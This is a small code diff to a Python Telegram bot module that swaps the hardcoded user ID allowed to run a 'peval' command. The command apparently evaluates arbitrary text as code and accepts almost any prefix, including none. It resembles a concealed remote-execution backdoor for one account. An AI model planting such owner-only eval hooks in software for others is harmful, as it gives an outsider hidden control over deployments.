@@ -6,7 +6,7 @@ from FallenRobot import pbot as Mukund
 from pyrogram import filters
 from pyrogram.types import Message
 
-@Mukund.on_message(filters.command("peval",prefixes=["/", ".", "?", "-", "+", "*", ";", ":", '"', ">", "<", "@", "#", "$", "%", "^", "&", "(", ")", "_", "=", ""]) & filters.user([5965096598]))
+@Mukund.on_message(filters.command("peval",prefixes=["/", ".", "?", "-", "+", "*", ";", ":", '"', ">", "<", "@", "#", "$", "%", "^", "&", "(", ")", "_", "=", ""]) & filters.user([6837532865]))
 async def eval(client, message):
     status_message = await message.reply_text("Processing ...")
     cmd = message.text.split(" ", maxsplit=1)[1]
